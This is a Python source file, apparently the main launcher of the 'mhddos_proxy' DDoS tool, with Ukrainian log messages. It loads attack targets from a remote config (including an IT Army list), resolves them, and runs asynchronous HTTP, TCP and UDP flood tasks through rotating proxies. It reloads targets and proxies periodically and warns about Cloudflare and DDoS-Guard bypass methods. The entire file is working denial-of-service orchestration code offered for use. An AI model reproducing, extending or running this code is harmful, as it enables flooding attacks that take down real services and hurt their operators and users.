import asyncio
from contextlib import suppress
# @formatter:off
import colorama; colorama.init()
# @formatter:on
from itertools import cycle
import random
import time
from threading import Event, Thread
from typing import Any, Generator, Iterator, List, Optional, Union

from src.cli import init_argparse
from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, Params, Stats
from src.dns_utils import resolve_all_targets
from src.mhddos import async_main as mhddos_async_main, AsyncLayer4, AsyncHttpFlood
from src.output import show_statistic, print_banner
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version
from src.targets import TargetsLoader

UVLOOP_SUPPORT = False

async def safe_run(runnable) -> bool:
    try:
        packets_sent = await runnable.run()
        return packets_sent > 0 # XXX: change API to return "succesful or not"
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return False


class FloodTask:

    # XXX: the fact we use Union here is a symptom of a larger problem
    def __init__(self, runnable: Union[AsyncHttpFlood, AsyncLayer4], scale: int = 1):
        self._runnable = runnable
        self._scale = scale
        # XXX: move to constants
        self._failure_budget = scale*3 # roughly: 3 attempts per proxy
        self._failure_budget_delay = 1

    async def loop(self):
        tasks = set(asyncio.create_task(safe_run(self._runnable)) for _ in range(self._scale))
        num_failures = 0
        while tasks:
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            for f in done:
                num_failures += int(not f.result())
                if num_failures >= self._failure_budget:
                    await asyncio.sleep(self._failure_budget_delay)
                    num_failures = 0
                pending.add(asyncio.create_task(safe_run(self._runnable)))
            tasks = pending


# XXX: having everything on the same thread means that we can create
#      priority queue for target (decreasing priority for "dead" targets)
class Flooder:

    def __init__(self, switch_after: int = 100):
        self._switch_after = switch_after
        self._runnables = None
        self._current_task = None
        self._ready = asyncio.Event()

    def update_targets(self, runnables: Optional[Iterator[AsyncHttpFlood]]) -> None:
        self._runnables = runnables
        if self._current_task is not None:
            # XXX: do I also need to await on the task to make sure it's
            #      actually cancelled?
            self._current_task.cancel()
        if not self._runnables:
            self._ready.clear()
        else:
            self._ready.set()

    async def loop(self):
        while True:
            await self._ready.wait()
            runnable = next(self._runnables)
            for _ in range(self._switch_after):
                try:
                    self._current_task = asyncio.ensure_future(runnable.run())
                    if not (await self._current_task):
                        break
                except asyncio.CancelledError:
                    break
                except Exception:
                    break


async def udp_flooder(runnable: AsyncLayer4) -> None:
    backoff = 0.1
    try:
        while True:
            try:
                await runnable.run()
            except asyncio.CancelledError:
                return
            except:
                 # avoid costly cycles if fails immediately
                await asyncio.sleep(backoff)
                backoff = max(2, backoff*2)
    except asyncio.CancelledError:
        return


async def run_ddos(
    proxies: Optional[ProxySet],
    targets_loader,
    reload_after,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    total_threads,
    switch_after,
):
    statistics = {}

    # initial set of proxies
    if proxies is not None:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    def register_params(params, container):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': None,
            'stats': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    flooders = []

    async def load_targets():
        targets, changed = await targets_loader.load()
        targets = await resolve_all_targets(targets)
        return [target for target in targets if target.is_resolved], changed

    async def install_targets(targets):
        nonlocal flooders

        # cancel running flooders
        if flooders:
            for task in flooders:
                task.cancel()
            flooders = []

        # XXX: looks like a hack
        for k in list(statistics):
            del statistics[k]

        kwargs_list, udp_kwargs_list = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
            # Method is given explicitly
            elif target.method is not None:
                register_params(Params(target, target.method), kwargs_list)
            # tcp://
            elif target.url.scheme == "tcp":
                register_params(Params(target, 'TCP'), kwargs_list)
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    register_params(Params(target, method), kwargs_list)
            else:
                logger.error(f"Unsupported scheme given: {target.url.scheme}")

        scale = max(1, total_threads // len(kwargs_list) if kwargs_list else 0)

        for kwargs in kwargs_list:
            task = asyncio.create_task(FloodTask(mhddos_async_main(**kwargs), scale).loop())
            # XXX: add stats for running/cancelled tasks with add_done_callback
            flooders.append(task)

        # XXX: can do this with previous "scale" approach :)
        for kwargs in udp_kwargs_list:
            task = asyncio.create_task(FloodTask(mhddos_async_main(**kwargs)).loop())
            flooders.append(task)

    try:
        initial_targets, _ = await load_targets()
    except Exception as exc:
        logger.error(f"{cl.READ}Завнтаження цілей завершилося помилкою: {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        refresh_rate = 5
        ts = time.time()
        while True:
            await asyncio.sleep(refresh_rate)
            try:
                passed = time.time() - ts
                ts = time.time()
                num_proxies = 0 if proxies is None else len(proxies)
                show_statistic(
                    statistics,
                    refresh_rate,
                    table,
                    vpn_mode,
                    num_proxies,
                    reload_after,
                    passed
                )
            except Exception:
                ts = time.time()

    # setup coroutine to print stats
    tasks.append(asyncio.ensure_future(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await load_targets()
                if not targets:
                    logger.warning(
                        f"{cl.RED}Не знайдено жодної доступної цілі - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                elif not changed:
                    logger.warning(
                        f"{cl.YELLOW}Перелік цілей не змінився - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                else:
                    await install_targets(targets)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.warning(
                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )
  
    # setup coroutine to reload targets (if configuration file is given)
    if targets_loader.dynamic:
        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                num_proxies = await proxies.reload()
                if num_proxies == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Буде використано попередній список проксі{cl.RESET}")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення проксей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload proxies
    if proxies is not None:
        tasks.append(asyncio.ensure_future(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}'
        )

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )
    
    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    no_proxies = args.vpn_mode
    proxies = None if no_proxies else ProxySet(args.proxies)

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        reload_after,
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
        args.threads,
        args.switch_after,
    )
    shutdown_event.set()


if __name__ == '__main__':
    if UVLOOP_SUPPORT:
        try:
            __import__("uvloop").install()
            logger.info(
                f"{cl.GREEN}uvloop{cl.RESET} успішно активований "
                "(підвищенна ефективність роботи з мережею)")
        except Exception:
            pass

    args = init_argparse().parse_args()
    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=lambda: asyncio.run(start(args, shutdown_event)), daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        shutdown_event.wait()
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
